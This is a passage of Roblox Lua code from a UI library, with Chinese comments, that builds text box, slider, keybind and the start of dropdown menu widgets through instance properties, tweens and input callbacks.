			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.RichText = true
			
			Content.Name = "Content"
            Content.Parent = TextBoxBlock
            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Content.BackgroundTransparency = 1.000
            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Content.BorderSizePixel = 0
            Content.Position = UDim2.new(0, 5, 0, 18)
            Content.Size = UDim2.new(1, 0, 0, 45)
            Content.Visible = false
            Content.ZIndex = 11
            Content.Font = Enum.Font.Gotham
            Content.Text = setup.Content
            Content.TextColor3 = Library.Colors.TextColor
            Content.TextSize = 13.000
            Content.TextStrokeColor3 = Library.Colors.TextColor
            Content.TextStrokeTransparency = 0.950
            Content.TextTransparency = 0.500
            Content.TextWrapped = true
            Content.TextXAlignment = Enum.TextXAlignment.Left
            Content.TextYAlignment = Enum.TextYAlignment.Top
            Content.RichText = true			

			Block.Name = "Block"
			Block.Parent = TextBoxBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Block.Size = UDim2.new(0, 50, 0.5, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(0.200000003, 0)
			UICorner.Parent = Block

			TextBox.Parent = Block
			TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
			TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextBox.BackgroundTransparency = 1.000
			TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextBox.BorderSizePixel = 0
			TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
			TextBox.Size = UDim2.new(0.949999988, 0, 0.550000012, 0)
			TextBox.ZIndex = 11
			TextBox.ClearTextOnFocus = false
			TextBox.Font = Enum.Font.Gotham
			TextBox.PlaceholderColor3 = Library.Colors.TextColor
			TextBox.Text = setup.Default
			TextBox.PlaceholderText = setup.PlaceHolder;
			TextBox.TextColor3 = Library.Colors.TextColor
			TextBox.TextSize = 12.000
			TextBox.TextStrokeTransparency = 0.950
			TextBox.TextWrapped = true

			local PlaceHolder = Library:GetTextSize(setup.PlaceHolder,13,TextBox.Font);

			local Update = function()
				if not WindowLibrary.Toggle then
					return;
				end

				local size = Library:GetTextSize(TextBox.Text,TextBox.TextSize,TextBox.Font);

				if WindowLibrary.Toggle then
					pcall(function()
						Library:Tween(Block,Library.TweenLibrary.SmallEffect,{
							Size = UDim2.new(0, math.clamp(size.X + 15 , PlaceHolder.X , TextBoxBlock.AbsoluteSize.X / 1.25), 0.5, 0);
						});
					end)
				end;
			end;

			Block.Size = UDim2.new(0, PlaceHolder.X, 0.5, 0);

			Library:MakeDrop(TextBoxBlock , UIStroke , Library.Colors.Hightlight)

			Library:MakeDrop(Block , UIStroke_2 , Library.Colors.Hightlight)

			TextBox:GetPropertyChangedSignal('Text'):Connect(function()
				if setup.Numeric then

					TextBox.Text = string.gsub(TextBox.Text, '[^0-9.]', '')

					Update();

					if not tonumber(TextBox.Text) then
						return;	
					end;

					setup.Callback(tonumber(TextBox.Text) or 0);
					return;
				end;


				Update()
				setup.Callback(TextBox.Text)
			end)

			TextBoxBlock:GetPropertyChangedSignal('AbsoluteSize'):Connect(Update);

			Update();
			
			local UpdateBlock = function()
                local TitleSize = TextLabel.TextSize
                local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
        
                local TotalHeight = MainSize.Y + 10 
                if setup.Content:len() > 0 then
                    Content.Visible = true
                    TotalHeight = TotalHeight + ContentSize.Y + 5 
                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
                    TextLabel.Size = UDim2.new(1, 0, 0, 14) 
                else
                    Content.Visible = false
                    TotalHeight = TotalHeight + 15.20000000000001 
                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0) 
                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                end

                TextBoxBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
            end
            UpdateBlock()

			local RootSkid = {};
			
			function RootSkid:Content(Setup)
                Content.Text = Setup
                UpdateBlock()
            end;

			function RootSkid:Empty()
				setup.Default = ""
				TextBox.Text = ""
				Update()
				setup.Callback('')
			end;

			function RootSkid:Value(Setup)
				setup.Default = Setup
				TextBox.Text = setup.Default
				Update()
				setup.Callback(setup.Default)
				UpdateBlock()
			end;

			function RootSkid:Visible(value)
				TextBoxBlock.Visible = value;
			end;

			return RootSkid;
		end;
------ // 滑块组件   ----------------------------------------------------------------------------------------
        function Root:Slider(setup)
			setup = setup or {};
			setup.Title = setup.Title or '滑块';
			setup.Content = setup.Content or "";
			setup.Min = setup.Min or 0;
			setup.Max = setup.Max or 100;
			setup.Default = setup.Default or setup.Min;
			setup.Round = setup.Round or 0;
			setup.Callback = setup.Callback or function() end;

			local SliderBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel")
			local Block = Instance.new("Frame")
			local UIStroke_2 = Instance.new("UIStroke")
			local UICorner = Instance.new("UICorner")
			local Move = Instance.new("ImageLabel")
			local UICorner_2 = Instance.new("UICorner")
			local UIStroke_3 = Instance.new("UIStroke")
			local ValueText = Instance.new("TextLabel")
			local InputBox = Instance.new("TextBox")

			SliderBlock.Name = "SliderBlock"
			SliderBlock.Parent = ScrollingFrame
			SliderBlock.BackgroundColor3 = Library.Colors.Default
			SliderBlock.BackgroundTransparency = 0.250
			SliderBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			SliderBlock.BorderSizePixel = 0
			SliderBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			SliderBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = SliderBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = SliderBlock

			TextLabel.RichText = true
			TextLabel.Parent = SliderBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			
			Content.Name = "Content"
            Content.Parent = SliderBlock
            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Content.BackgroundTransparency = 1.000
            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Content.BorderSizePixel = 0
            Content.Position = UDim2.new(0, 5, 0, 18)
            Content.Size = UDim2.new(1, 0, 0, 45)
            Content.Visible = false
            Content.ZIndex = 11
            Content.Font = Enum.Font.Gotham
            Content.Text = setup.Content
            Content.TextColor3 = Library.Colors.TextColor
            Content.TextSize = 13.000
            Content.TextStrokeColor3 = Library.Colors.TextColor
            Content.TextStrokeTransparency = 0.950
            Content.TextTransparency = 0.500
            Content.TextWrapped = true
            Content.TextXAlignment = Enum.TextXAlignment.Left
            Content.TextYAlignment = Enum.TextYAlignment.Top
            Content.RichText = true			
			
			Block.Name = "Block"
			Block.Parent = SliderBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.649999976, 0)
			Block.Size = UDim2.new(0, 95, 0.45, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(0.300000012, 0)
			UICorner.Parent = Block

			Move.Name = "Move"
			Move.Parent = Block
			Move.AnchorPoint = Vector2.new(0.5, 0.5)

			Move.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Move.BackgroundTransparency = 1 
			Move.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Move.BorderSizePixel = 0
			Move.Position = UDim2.new(0.5, 0, 0.5, 0)
			Move.Size = UDim2.new(1.5, 0, 1.5, 0)
			Move.SizeConstraint = Enum.SizeConstraint.RelativeYY
			Move.ZIndex = 15
			Move.Image = "rbxassetid://96996396016819"
			Move.ImageColor3 = Color3.fromRGB(255, 255, 255)
			Move.ImageTransparency = 0 
			Move.ScaleType = Enum.ScaleType.Slice
			Move.SliceCenter = Rect.new(50, 50, 50, 50)
			Move.SliceScale = 1.0 

			UICorner_2.CornerRadius = UDim.new(1, 0)
			UICorner_2.Parent = Move

			UIStroke_3.Transparency = 0.850
			UIStroke_3.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_3.Parent = Move

			ValueText.Name = "ValueText"
			ValueText.Parent = SliderBlock
			ValueText.AnchorPoint = Vector2.new(0, 0.5)
			ValueText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ValueText.BackgroundTransparency = 1.000
			ValueText.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ValueText.BorderSizePixel = 0
			ValueText.Position = UDim2.new(0.0199999996, 0, 0.239999995, 0)
			ValueText.Size = UDim2.new(0.964999974, 0, 0.25, 0)
			ValueText.ZIndex = 11
			ValueText.Font = Enum.Font.Gotham
			ValueText.Text = tostring(setup.Default)
			ValueText.TextColor3 = Library.Colors.TextColor
			ValueText.TextScaled = true
			ValueText.TextSize = 14.000
			ValueText.TextStrokeColor3 = Library.Colors.TextColor
			ValueText.TextStrokeTransparency = 0.950
			ValueText.TextWrapped = true
			ValueText.TextXAlignment = Enum.TextXAlignment.Right
			
			InputBox.Name = "InputBox"
		    InputBox.Parent = SliderBlock
    		InputBox.BackgroundColor3 = Library.Colors.Default
    	    InputBox.BackgroundTransparency = 1.000
    	    InputBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
    	    InputBox.BorderSizePixel = 0
    	    InputBox.Position = UDim2.new(0.25, 0, 0.4, 0)
    	    InputBox.Size = UDim2.new(0.180000007, 0, 0.400000006, 0)
    	    InputBox.ZIndex = 11
    	    InputBox.Font = Enum.Font.Gotham
    	    InputBox.TextColor3 = Library.Colors.TextColor
    	    InputBox.TextScaled = true
    	    InputBox.TextSize = 14.000
    	    InputBox.TextStrokeColor3 = Library.Colors.TextColor
    	    InputBox.TextStrokeTransparency = 0.950
    	    InputBox.TextWrapped = true
    	    InputBox.TextXAlignment = Enum.TextXAlignment.Right
    	    InputBox.Text = tostring(setup.Default)

			local IsHold = false
			local RoundNum = setup.Round;

			Library:MakeDrop(SliderBlock , UIStroke , Library.Colors.Hightlight)


			if setup.Tip then
				WindowLibrary:AddToolTip(SliderBlock , tostring(setup.Tip));
			end;

			local function Rounding(num, numDecimalPlaces)
				local mult = 10^(numDecimalPlaces or 0)
				return math.floor(num * mult + 0.5) / mult
			end

			local UpdateSize = function()
				if not WindowLibrary.Toggle then
					return;
				end

				Block.Size = UDim2.new(0, (SliderBlock.AbsoluteSize.X / 2), 0.225, 0)
			end;

			Library:Tween(Move , Library.TweenLibrary.FastEffect,{
				Position = UDim2.new((setup.Default - setup.Min) / (setup.Max - setup.Min), 0, 0.5, 0)
			});

			SliderBlock:GetPropertyChangedSignal('AbsoluteSize'):Connect(UpdateSize);


			local function update(Input)
			    local SizeScale = math.clamp((((Input.Position.X) - Block.AbsolutePosition.X) / Block.AbsoluteSize.X), 0, 1)
			    local Main = ((setup.Max - setup.Min) * SizeScale) + setup.Min;
			    local Value = Rounding(Main, RoundNum)
			    local normalized = (Value - setup.Min) / (setup.Max - setup.Min)

			    Library:Tween(Move, Library.TweenLibrary.FastEffect, {
			        Position = UDim2.new(normalized, 0, 0.5, 0)
			    });

			    ValueText.Text = tostring(Value)
			    InputBox.Text = tostring(Value)

			    currentSliderValue = Value 
			    setup.Callback(Value)
			end;

			Block.InputBegan:Connect(function(Input)
				if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
					IsHold = true
					update(Input)
				end
			end)

			Block.InputEnded:Connect(function(Input)
				if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
					IsHold = false
    				end
			end)

            Library.UserInputService.InputChanged:Connect(function(Input)
                if IsHold then
                    if (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch) then
                        update(Input)
                    end
                end
            end)

			InputBox:GetPropertyChangedSignal("Text"):Connect(function()
			        local textValue = tonumber(InputBox.Text) or setup.Default
			        if textValue then
			            local normalized = (textValue - setup.Min) / (setup.Max - setup.Min)
			            Library:Tween(Move, Library.TweenLibrary.FastEffect, {
			                Position = UDim2.new(normalized, 0, 0.5, 0)
			            });
			            ValueText.Text = tostring(textValue)
			            setup.Callback(textValue)
			        end
			    end)
			
			local UpdateBlock = function()
                local TitleSize = TextLabel.TextSize
                local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
        
                local TotalHeight = MainSize.Y + 10
                if setup.Content:len() > 0 then
                    Content.Visible = true
                    TotalHeight = TotalHeight + ContentSize.Y + 5 
                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
                else
                    Content.Visible = false
                    TotalHeight = TotalHeight + 15.20000000000001
                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                end

                SliderBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
            end
            UpdateBlock()
			    
			local RootSkid = {};
			
			function RootSkid:Content(Setup)
                Content.Text = Setup
                UpdateBlock()
            end;

			function RootSkid:Value(Setup)
				setup.Default = Setup;

				Library:Tween(Move , Library.TweenLibrary.FastEffect,{
					Position = UDim2.new(setup.Default / setup.Max, 0, 0.5, 0)
				});

				ValueText.Text = tostring(setup.Default) .. '/' .. tostring(setup.Max)
				UpdateBlock()
			end;

			function RootSkid:Visible(value)
				SliderBlock.Visible = value;	
			end;

			return RootSkid;
		end;
------ // 按钮绑定键<快捷键>   ----------------------------------------------------------------------------------------
		function Root:Keybind(setup)
			setup = setup or {};
			setup.Title = setup.Title or "快捷键";
			setup.Content = setup.Content or "";
			setup.Default = setup.Default or "NONE";
			setup.Callback = setup.Callback or function() end;

			local Parser = function(code)
				if typeof(code) == 'EnumItem' then
					return code.Name;	
				end;

				local i,d = pcall(function()
					return Enum.KeyCode[code]
				end)

				if i then	
					return d.Name;
				end;

				return "NONE"
			end;

			local KeybindBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel")
			local Block = Instance.new("Frame")
			local UIStroke_2 = Instance.new("UIStroke")
			local UICorner = Instance.new("UICorner")
			local ValueText = Instance.new("TextLabel")
			local Button = Instance.new("TextButton")

			KeybindBlock.Name = "KeybindBlock"
			KeybindBlock.Parent = ScrollingFrame
			KeybindBlock.BackgroundColor3 = Library.Colors.Default
			KeybindBlock.BackgroundTransparency = 0.250
			KeybindBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			KeybindBlock.BorderSizePixel = 0
			KeybindBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			KeybindBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = KeybindBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = KeybindBlock

			TextLabel.Parent = KeybindBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.RichText = true
			
			Content.Name = "Content"
            Content.Parent = KeybindBlock
            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Content.BackgroundTransparency = 1.000
            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Content.BorderSizePixel = 0
            Content.Position = UDim2.new(0, 5, 0, 18)
            Content.Size = UDim2.new(1, 0, 0, 45)
            Content.Visible = false
            Content.ZIndex = 11
            Content.Font = Enum.Font.Gotham
            Content.Text = setup.Content
            Content.TextColor3 = Library.Colors.TextColor
            Content.TextSize = 13.000
            Content.TextStrokeColor3 = Library.Colors.TextColor
            Content.TextStrokeTransparency = 0.950
            Content.TextTransparency = 0.500
            Content.TextWrapped = true
            Content.TextXAlignment = Enum.TextXAlignment.Left
            Content.TextYAlignment = Enum.TextYAlignment.Top
            Content.RichText = true			

			Block.Name = "Block"
			Block.Parent = KeybindBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Block.Size = UDim2.new(0, 50, 0.5, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(0.300000012, 0)
			UICorner.Parent = Block

			ValueText.Name = "ValueText"
			ValueText.Parent = Block
			ValueText.AnchorPoint = Vector2.new(0.5, 0.5)
			ValueText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ValueText.BackgroundTransparency = 1.000
			ValueText.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ValueText.BorderSizePixel = 0
			ValueText.Position = UDim2.new(0.5, 0, 0.5, 0)
			ValueText.Size = UDim2.new(0.800000012, 0, 0.800000012, 0)
			ValueText.ZIndex = 17
			ValueText.Font = Enum.Font.Gotham
			ValueText.Text = Parser(setup.Default)
			ValueText.TextColor3 = Library.Colors.TextColor
			ValueText.TextScaled = true
			ValueText.TextSize = 14.000
			ValueText.TextStrokeColor3 = Library.Colors.TextColor
			ValueText.TextStrokeTransparency = 0.950
			ValueText.TextWrapped = true

			Button.Name = "Button"
			Button.Parent = KeybindBlock
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 15
			Button.Font = Enum.Font.SourceSans
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000

			Library:MakeDrop(KeybindBlock , UIStroke , Library.Colors.Hightlight);

			if setup.Tip then
				WindowLibrary:AddToolTip(KeybindBlock , tostring(setup.Tip));
			end;

			local UpdateSize = function()
				local Size = Library:GetTextSize(ValueText.Text,ValueText.TextSize,ValueText.Font);

				Library:Tween(Block , Library.TweenLibrary.SmallEffect,{
					Size = UDim2.new(0,Size.X + 10,0.5,0)
				})
			end;

			UpdateSize();

			local Await = false;

			Button.MouseButton1Click:Connect(function()
				if Await then return; end;

				Await = true;
				local KeyCode = nil;

				ValueText.Text = '...';

				UpdateSize()

				while true do

					local Input = Library.UserInputService.InputBegan:Wait();

					if Input.KeyCode and Input.KeyCode ~= Enum.KeyCode.Unknown then
						KeyCode = Input.KeyCode;
						break;
					end;
				end;

				ValueText.Text = KeyCode.Name;

				UpdateSize();

				setup.Callback(KeyCode)
				Await = false;
			end)
			
			local UpdateBlock = function()
                local TitleSize = TextLabel.TextSize
                local MainSize = Library:GetTextSize(setup.Title, TitleSize, TextLabel.Font)
                local ContentSize = setup.Content:len() > 0 and Library:GetTextSize(setup.Content, Content.TextSize, Content.Font) or Vector2.new(0, 0)
        
                local TotalHeight = MainSize.Y + 10
                if setup.Content:len() > 0 then
                    Content.Visible = true
                    TotalHeight = TotalHeight + ContentSize.Y + 5
                    TextLabel.Position = UDim2.new(0, 5, 0, 12)
                    TextLabel.Size = UDim2.new(1, 0, 0, 14)
                else
                    Content.Visible = false
                    TotalHeight = TotalHeight + 15.20000000000001
                    TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
                    TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
                end

                KeybindBlock.Size = UDim2.new(0.99000001, 0, 0, TotalHeight)
            end
            UpdateBlock()

			local RootSkid = {};
			
			function RootSkid:Content(Setup)
                Content.Text = Setup
                UpdateBlock()
            end;

			function RootSkid:Value(Setup)
				setup.Default = Setup;

				ValueText.Text = Parser(Setup);

				UpdateSize();

				setup.Callback(Setup)
				UpdateBlock()
			end;

			function RootSkid:Visible(value)
				KeybindBlock.Visible = value;
			end;

			return RootSkid;
		end;
------ // 下拉菜单   ----------------------------------------------------------------------------------------
		function Root:Dropdown(setup)
			setup = setup or {};
			setup.Title = setup.Title or "下拉菜单";
			setup.Content = setup.Content or "";
			setup.Values = setup.Values or {};
			setup.Multi = setup.Multi or false;
			setup.Default = setup.Default;
			setup.MaxMulti = setup.MaxMulti or math.huge;
			setup.Callback = setup.Callback or function() end;

			local Fconcat = function(a)
				if typeof(a) ~= 'table' then
					return tostring(a);
				end;

				local p,l = pcall(table.concat,a,' , ')

				if p then return l; end;

				local std = {};

				table.foreach(a,function(a,v)
					if typeof(v) == 'boolean' then
						table.insert(std,tostring(a));
					else
						table.insert(std,tostring(v));
					end;
				end)

				return table.concat(std,' , ')
			end;

			local DropdownBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local TextLabel = Instance.new("TextLabel")
			local Content = Instance.new("TextLabel")
			local Block = Instance.new("Frame")
			local UIStroke_2 = Instance.new("UIStroke")
			local UICorner = Instance.new("UICorner")
			local Button = Instance.new("TextButton")
			local ValueText = Instance.new("TextLabel")

			DropdownBlock.Name = "DropdownBlock"
			DropdownBlock.Parent = ScrollingFrame
			DropdownBlock.BackgroundColor3 = Library.Colors.Default
			DropdownBlock.BackgroundTransparency = 0.250
			DropdownBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			DropdownBlock.BorderSizePixel = 0
			DropdownBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
			DropdownBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = DropdownBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = DropdownBlock

			TextLabel.Parent = DropdownBlock
			TextLabel.AnchorPoint = Vector2.new(0, 0.5)
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0.0199999996, 0, 0.5, 0)
			TextLabel.Size = UDim2.new(1, 0, 0.400000006, 0)
			TextLabel.ZIndex = 11
			TextLabel.Font = Enum.Font.Gotham
			TextLabel.Text = setup.Title
			TextLabel.TextColor3 = Library.Colors.TextColor
			TextLabel.TextScaled = true
			TextLabel.TextSize = 14.000
			TextLabel.TextStrokeColor3 = Library.Colors.TextColor
			TextLabel.TextStrokeTransparency = 0.950
			TextLabel.TextWrapped = true
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			TextLabel.RichText = true
			
			Content.Name = "Content"
            Content.Parent = DropdownBlock
            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Content.BackgroundTransparency = 1.000
            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Content.BorderSizePixel = 0
            Content.Position = UDim2.new(0, 5, 0, 18)
            Content.Size = UDim2.new(1, 0, 0, 45)
            Content.Visible = false
            Content.ZIndex = 11
            Content.Font = Enum.Font.Gotham
            Content.Text = setup.Content
            Content.TextColor3 = Library.Colors.TextColor
            Content.TextSize = 13.000
            Content.TextStrokeColor3 = Library.Colors.TextColor
            Content.TextStrokeTransparency = 0.950
            Content.TextTransparency = 0.500
            Content.TextWrapped = true
            Content.TextXAlignment = Enum.TextXAlignment.Left
            Content.TextYAlignment = Enum.TextYAlignment.Top
            Content.RichText = true

			Block.Name = "Block"
			Block.Parent = DropdownBlock
			Block.AnchorPoint = Vector2.new(1, 0.5)
			Block.BackgroundColor3 = Library.Colors.Default
			Block.BackgroundTransparency = 0.500
			Block.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Block.BorderSizePixel = 0
			Block.Position = UDim2.new(0.980000019, 0, 0.5, 0)
			Block.Size = UDim2.new(0, 75, 0.600000024, 0)
			Block.ZIndex = 14

			UIStroke_2.Transparency = 0.850
			UIStroke_2.Color = Color3.fromRGB(156, 156, 156)
			UIStroke_2.Parent = Block

			UICorner.CornerRadius = UDim.new(0.200000003, 0)
			UICorner.Parent = Block

			Button.Name = "Button"
			Button.Parent = Block
			Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Button.BackgroundTransparency = 1.000
			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Button.BorderSizePixel = 0
			Button.Size = UDim2.new(1, 0, 1, 0)
			Button.ZIndex = 20
			Button.Font = Enum.Font.SourceSans
			Button.TextColor3 = Color3.fromRGB(0, 0, 0)
			Button.TextSize = 14.000
			Button.TextTransparency = 1.000

			ValueText.Name = "ValueText"
			ValueText.Parent = Block
			ValueText.AnchorPoint = Vector2.new(0.5, 0.5)
			ValueText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ValueText.BackgroundTransparency = 1.000
			ValueText.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ValueText.BorderSizePixel = 0
			ValueText.Position = UDim2.new(0.5, 0, 0.5, 0)
			ValueText.Size = UDim2.new(0.800000012, 0, 0.600000024, 0)
			ValueText.ZIndex = 17
			ValueText.Font = Enum.Font.Gotham
